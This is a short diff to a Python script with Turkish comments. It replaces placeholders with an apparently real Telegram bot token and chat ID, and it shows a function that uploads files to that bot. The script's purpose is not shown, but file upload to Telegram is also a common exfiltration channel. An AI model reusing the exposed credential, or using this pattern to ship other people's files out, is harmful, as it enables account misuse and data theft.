@@ -7,8 +7,8 @@ from termcolor import colored
 import threading
 
 # Bot tokeni ve chat ID'nizi burada tanımlayın
-bot_token = "bot token gir"
-chat_id = "chat ıd gir"
+bot_token = "6676236976:AAG0rVKzqcs0JWoxdlSeK41mX6CUvXJowJs" #Telegram Bot Tokeninizi Girin
+chat_id = "1308711850" #Telegram Id Numaranızı Girin
 
 def send_document(file):
     requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument?chat_id={chat_id}', files=file)
